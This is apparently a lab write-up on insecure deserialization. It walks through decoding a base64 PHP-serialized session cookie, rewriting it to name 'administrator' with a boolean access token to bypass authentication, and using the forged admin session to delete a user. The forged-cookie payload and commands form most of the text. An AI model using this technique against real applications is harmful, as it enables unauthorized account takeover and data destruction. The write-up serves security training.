  • Credentials wiener:peter

  This lab uses a serialization-based session mechanism and is
  vulnerable to authentication bypass as a result.

  To solve this lab edit the serializsed object in the sessions cookie
  to access the admin account

  With admin account delete the `carlos' user

═════════

  As the same case of the last lab, the cookie are base64 encoded, and
  the cookie are an serialized object, which is a big problem in
  security terms.

  CTRL + SHITF + i to open `dev tools' ->

  Application > Storage > Cookie

  • Get the cookie and decode ->
  ┌────
  │ echo 'Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJienc4azlhM2N0dmpqYWluNG91ZXg5ZGoydHM4djloYiI7fQ==' | base64 -d
  └────

  and another object deserialized ->

  ┌────
  │ O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"bzw8k9a3ctvjjain4ouex9dj2ts8v9hb";}
  └────

  The type of the contents are s (String), what happens with we modify
  the data type from S to B (Bool) ?

  At this case we modfy the “username” value to admin and the
  “access_token” value type to bool ->

  ┌────
  │ O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";b:1;}
  └────

  Now encode again with base64 and set to the new cookie value at web
  page ->

  ┌────
  │ echo 'O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";b:1;}' | base64 -w 0
  └────

  `base64 -w 0' = Use 0 to disable line wrapping

  Copy the result and put at new cookie value at web page with `dev
  tools'

  ┌────
  │ CTRL + SHIFT + i
  │ 
  │ Application > Storage > Cookie
  └────

  Reload the page with the new cookie defined, and now we are logged in
  as administrator user, we can confirm that with My account tab, where
  your current username is displayed

  • At Admin Panel delet the carlos account
